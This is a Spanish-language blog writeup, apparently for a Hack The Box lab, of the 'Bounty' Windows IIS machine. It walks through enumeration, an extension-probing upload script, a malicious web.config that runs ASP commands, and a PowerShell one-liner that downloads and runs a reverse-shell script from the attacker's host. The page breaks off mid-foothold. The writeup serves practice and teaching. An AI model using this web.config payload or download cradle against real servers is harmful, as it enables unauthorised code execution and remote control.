<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el Teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.jpeg"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-bounty-writeup">Hack The Box: Bounty Writeup</h1>
<p>Welcome to my detailed writeup of the easy difficulty machine <strong>&ldquo;Bounty&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.249.211 --ulimit <span style="color:#ae81ff">5000</span> -g
</span></span><span style="display:flex;"><span>10.129.249.211 -&gt; <span style="color:#f92672">[</span>80<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p80 -sCV 10.129.249.211 -oN allPorts
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-08 08:09 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.249.211
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 7.5
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>|_http-title: Bounty
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/7.5
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.98 seconds
</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -n -Pn --min-rate <span style="color:#ae81ff">5000</span> -sU 10.129.249.211 -oN allPorts.UDP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-08 08:10 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.249.211
</span></span><span style="display:flex;"><span>Host is up.
</span></span><span style="display:flex;"><span>All <span style="color:#ae81ff">1500</span> scanned ports on 10.129.249.211 are in ignored states.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1500</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 2.38 seconds
</span></span></code></pre></div><p>Solo vemos el puerto <code>80/TCP</code> abierto, así que&hellip;</p>
<h1 id="http-enumeration">HTTP Enumeration</h1>
<p>Por detrás vemos que existe un IIS.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://10.129.249.211
</span></span><span style="display:flex;"><span>http://10.129.249.211 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Microsoft-IIS/7.5<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.249.211<span style="color:#f92672">]</span>, Microsoft-IIS<span style="color:#f92672">[</span>7.5<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>Bounty<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>ASP.NET<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Vemos esta imagen al acceder al sitio web.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Podemos analizar los metadatos de esta imagen pero no vemos nada interesante.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ exiftool merlin.jpg 
</span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.57
</span></span><span style="display:flex;"><span>File Name                       : merlin.jpg
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">781</span> kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2018:05:30 22:35:50+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:08:08 08:12:29+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:08:08 08:12:29+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : JPEG
</span></span><span style="display:flex;"><span>File Type Extension             : jpg
</span></span><span style="display:flex;"><span>MIME Type                       : image/jpeg
</span></span><span style="display:flex;"><span>JFIF Version                    : 1.02
</span></span><span style="display:flex;"><span>Exif Byte Order                 : Big-endian <span style="color:#f92672">(</span>Motorola, MM<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Orientation                     : Horizontal <span style="color:#f92672">(</span>normal<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>X Resolution                    : <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>Y Resolution                    : <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>Resolution Unit                 : inches
</span></span><span style="display:flex;"><span>Software                        : Adobe Photoshop CS4 Windows
</span></span><span style="display:flex;"><span>Modify Date                     : 2012:03:20 00:51:07
</span></span><span style="display:flex;"><span>Color Space                     : sRGB
</span></span><span style="display:flex;"><span>Exif Image Width                : <span style="color:#ae81ff">2000</span>
</span></span><span style="display:flex;"><span>Exif Image Height               : <span style="color:#ae81ff">2000</span>
</span></span><span style="display:flex;"><span>Compression                     : JPEG <span style="color:#f92672">(</span>old-style<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Thumbnail Offset                : <span style="color:#ae81ff">332</span>
</span></span><span style="display:flex;"><span>Thumbnail Length                : <span style="color:#ae81ff">5883</span>
</span></span><span style="display:flex;"><span>IPTC Digest                     : <span style="color:#ae81ff">00000000000000000000000000000000</span>
</span></span><span style="display:flex;"><span>Displayed Units X               : inches
</span></span><span style="display:flex;"><span>Displayed Units Y               : inches
</span></span><span style="display:flex;"><span>Print Style                     : Centered
</span></span><span style="display:flex;"><span>Print Position                  : <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Print Scale                     : <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Global Angle                    : <span style="color:#ae81ff">120</span>
</span></span><span style="display:flex;"><span>Global Altitude                 : <span style="color:#ae81ff">30</span>
</span></span><span style="display:flex;"><span>URL List                        : 
</span></span><span style="display:flex;"><span>Slices Group Name               : Untitled-1
</span></span><span style="display:flex;"><span>Num Slices                      : <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Pixel Aspect Ratio              : <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Photoshop Thumbnail             : <span style="color:#f92672">(</span>Binary data <span style="color:#ae81ff">5883</span> bytes, use -b option to extract<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Has Real Merged Data            : Yes
</span></span><span style="display:flex;"><span>Writer Name                     : Adobe Photoshop
</span></span><span style="display:flex;"><span>Reader Name                     : Adobe Photoshop CS4
</span></span><span style="display:flex;"><span>Photoshop Quality               : <span style="color:#ae81ff">12</span>
</span></span><span style="display:flex;"><span>Photoshop Format                : Standard
</span></span><span style="display:flex;"><span>Image Width                     : <span style="color:#ae81ff">2000</span>
</span></span><span style="display:flex;"><span>Image Height                    : <span style="color:#ae81ff">2000</span>
</span></span><span style="display:flex;"><span>Encoding Process                : Baseline DCT, Huffman coding
</span></span><span style="display:flex;"><span>Bits Per Sample                 : <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>Color Components                : <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>Y Cb Cr Sub Sampling            : YCbCr4:4:4 <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> 1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Image Size                      : 2000x2000
</span></span><span style="display:flex;"><span>Megapixels                      : 4.0
</span></span><span style="display:flex;"><span>Thumbnail Image                 : <span style="color:#f92672">(</span>Binary data <span style="color:#ae81ff">5883</span> bytes, use -b option to extract<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Haciendo fuzzing con <code>feroxbuster</code> (no os echéis encima mía) encontramos una ruta interesante.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ feroxbuster -u http://10.129.249.211 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -d <span style="color:#ae81ff">1</span> -t <span style="color:#ae81ff">100</span> -x asp,aspx
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET     1624l    16517w  1403476c http://10.129.249.211/merlin.jpg
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       32l       53w      630c http://10.129.249.211/
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       22l       58w      941c http://10.129.249.211/transfer.aspx
</span></span></code></pre></div><p><code>transfer.aspx</code> , vamos a ver que es esto.
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>Tiene pinta de una subida de archivos, de aquí podemos pensar el vector de ataque que será un archivo malicioso para intentar ejecutar código, lo que todavía no sabemos es donde se suben estos archivos.</p>
<p><code>$ echo &quot;Esto es una prueba&quot; &gt; test.txt</code>
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p>Parece que archivos txt no le gusta, vamos a probar a subir una imagen.</p>
<p>Voy a subir la misma imagen de Merlín pero con diferente nombre, <code>test.jpg</code></p>
<p><img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<h1 id="finding-exploitable-extensions">Finding Exploitable Extensions</h1>
<p>¿Y ahora donde se ha subido este archivo?
Como es una máquina fácil, paré el <code>feroxbuster</code> muy pronto, pero si lo dejamos unos segundos mas&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET        2l       10w      159c http://10.129.249.211/uploadedFiles <span style="color:#f92672">=</span>&gt; http://10.129.249.211/uploadedFile
</span></span></code></pre></div><p>Perfecto, pero subir una imagen no me sirve de mucho..
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>Me interesa reconocer que tipo de archivos puedo subir al servidor, y para ello podemos utilizar el <code>intruder</code> de <code>burpsuite</code> , pero como a mi me gusta complicarme la vida, vamos a crear un pequeño script en python :)</p>
<p>Podemos utilizar <a href="https://book.hacktricks.xyz/pentesting-web/file-upload">esta</a> lista de extensiones que proporciona HackTricks.
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>UPLOAD_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://10.129.249.211/transfer.aspx&#34;</span>
</span></span><span style="display:flex;"><span>EXTENSIONS <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.asp&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.aspx&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.config&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.ashx&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.asmx&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.aspq&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.axd&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.cshtm&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.cshtml&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.rem&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.soap&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.vbhtm&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.vbhtml&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.asa&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.cer&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;.shtml&#34;</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_request</span>(extension):
</span></span><span style="display:flex;"><span>    files <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;FileUpload1&#39;</span>: (<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;test.</span><span style="color:#e6db74">{</span>extension<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, open(<span style="color:#e6db74">&#39;test.txt&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read())}   
</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(UPLOAD_URL) <span style="color:#75715e"># __VIEWSTATE and __EVENTVALIDATION</span>
</span></span><span style="display:flex;"><span>    soup <span style="color:#f92672">=</span> BeautifulSoup(r<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
</span></span><span style="display:flex;"><span>    viewstate <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;input&#39;</span>, {<span style="color:#e6db74">&#39;name&#39;</span>: <span style="color:#e6db74">&#39;__VIEWSTATE&#39;</span>})[<span style="color:#e6db74">&#39;value&#39;</span>]
</span></span><span style="display:flex;"><span>    eventvalidation <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;input&#39;</span>, {<span style="color:#e6db74">&#39;name&#39;</span>: <span style="color:#e6db74">&#39;__EVENTVALIDATION&#39;</span>})[<span style="color:#e6db74">&#39;value&#39;</span>]
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;__VIEWSTATE&#34;</span>: viewstate,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;__EVENTVALIDATION&#34;</span>: eventvalidation,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;btnUpload&#34;</span>: <span style="color:#e6db74">&#34;Upload&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(UPLOAD_URL, files<span style="color:#f92672">=</span>files, data<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Invalid File. Please try again&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>        log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;Extensión válida </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> extension )
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload</span>():
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#34;Probando extensiones&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> extension <span style="color:#f92672">in</span> EXTENSIONS:
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#34;: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> extension)
</span></span><span style="display:flex;"><span>        do_request(extension)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    upload()
</span></span></code></pre></div><p>Si ejecutamos el script..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 upload.py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>q<span style="color:#f92672">]</span> Probando extensiones: : .shtml
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensión válida .config
</span></span></code></pre></div><p>Podemos subir un archivo .config.</p>
<p>Buscando un poco en Google, encontramos que hay una forma de conseguir RCE a través de la subida de un archivo web.config malicioso
<a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/">https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/</a></p>
<p>Al subir el web.config adjuntado, si la máquina víctima es vulnerable, al cargar el archivo <code>web.config</code> debería de mostrarse el número 3, esto significaría que se estaría ejecutando código.</p>
<p><img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<h1 id="foothold">Foothold</h1>
<p>Podemos confirmar el RCE modificando el archivo <code>web.config</code> para intentar ejecutar un comando a nivel de sistema.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;configuration&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;system.webServer&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;handlers</span> <span style="color:#a6e22e">accessPolicy=</span><span style="color:#e6db74">&#34;Read, Script, Write&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;web_config&#34;</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;*.config&#34;</span> <span style="color:#a6e22e">verb=</span><span style="color:#e6db74">&#34;*&#34;</span> <span style="color:#a6e22e">modules=</span><span style="color:#e6db74">&#34;IsapiModule&#34;</span> <span style="color:#a6e22e">scriptProcessor=</span><span style="color:#e6db74">&#34;%windir%\system32\inetsrv\asp.dll&#34;</span> <span style="color:#a6e22e">resourceType=</span><span style="color:#e6db74">&#34;Unspecified&#34;</span> <span style="color:#a6e22e">requireAccess=</span><span style="color:#e6db74">&#34;Write&#34;</span> <span style="color:#a6e22e">preCondition=</span><span style="color:#e6db74">&#34;bitness64&#34;</span> <span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/handlers&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;security&gt;</span>
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&lt;requestFiltering&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;fileExtensions&gt;</span>
</span></span><span style="display:flex;"><span>               <span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">fileExtension=</span><span style="color:#e6db74">&#34;.config&#34;</span> <span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/fileExtensions&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;hiddenSegments&gt;</span>
</span></span><span style="display:flex;"><span>               <span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">segment=</span><span style="color:#e6db74">&#34;web.config&#34;</span> <span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/hiddenSegments&gt;</span>
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&lt;/requestFiltering&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/security&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;/system.webServer&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/configuration&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;%
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&#39; Ejecutar un comando del sistema
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Set objShell = Server.CreateObject(&#34;WScript.Shell&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">cmd = &#34;cmd.exe /c ping 10.10.14.91&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Set objExec = objShell.Exec(cmd)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">output = objExec.StdOut.ReadAll
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Response.Write(output)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">%&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo tcpdump -i tun0 icmp
</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
</span></span><span style="display:flex;"><span>listening on tun0, link-type RAW <span style="color:#f92672">(</span>Raw IP<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
</span></span><span style="display:flex;"><span>09:19:11.720161 IP 10.129.249.211 &gt; 10.10.14.91: ICMP echo request, id 1, seq 1, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>09:19:11.720185 IP 10.10.14.91 &gt; 10.129.249.211: ICMP echo reply, id 1, seq 1, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>09:19:12.723036 IP 10.129.249.211 &gt; 10.10.14.91: ICMP echo request, id 1, seq 2, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>09:19:12.723055 IP 10.10.14.91 &gt; 10.129.249.211: ICMP echo reply, id 1, seq 2, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>09:19:13.721560 IP 10.129.249.211 &gt; 10.10.14.91: ICMP echo request, id 1, seq 3, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>09:19:13.721580 IP 10.10.14.91 &gt; 10.129.249.211: ICMP echo reply, id 1, seq 3, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>09:19:14.720033 IP 10.129.249.211 &gt; 10.10.14.91: ICMP echo request, id 1, seq 4, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>09:19:14.720058 IP 10.10.14.91 &gt; 10.129.249.211: ICMP echo reply, id 1, seq 4, length <span style="color:#ae81ff">40</span>
</span></span></code></pre></div><p>¡Y tenemos RCE!</p>
<p>Haciendo pruebas tuve que reiniciar la máquina, a partir de ahora la IP de la máquina víctima es <code>10.129.212.243</code></p>
<p>Ahora con <code>Invoke-PowerShellTcp.ps1</code> de <code>nishang</code> vamos a mandarnos la reverse shell.</p>
<p>Modificamos el script inicial y añadimos la siguiente línea.
<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>Modificamos el <code>web.config</code> para ejecutar el típico one-liner en powershell&hellip;</p>
<pre tabindex="0"><code class="language-aspx" data-lang="aspx">&lt;%
&#39; Ejecutar un comando del sistema
Set objShell = Server.CreateObject(&#34;WScript.Shell&#34;)
cmd = &#34;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.91:8081/Invoke-PowerShellTcp.ps1&#39;)&#34;
Set objExec = objShell.Exec(cmd)
output = objExec.StdOut.ReadAll
Response.Write(output)
%&gt;
</code></pre><p>Ahora servimos este script con <code>python</code> usando su módulo <code>http.server</code> por el puerto 8081 y si nos ponemos en escucha con <code>netcat</code> , subimos el <code>web.config</code> malicioso, y cargamos el recurso&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
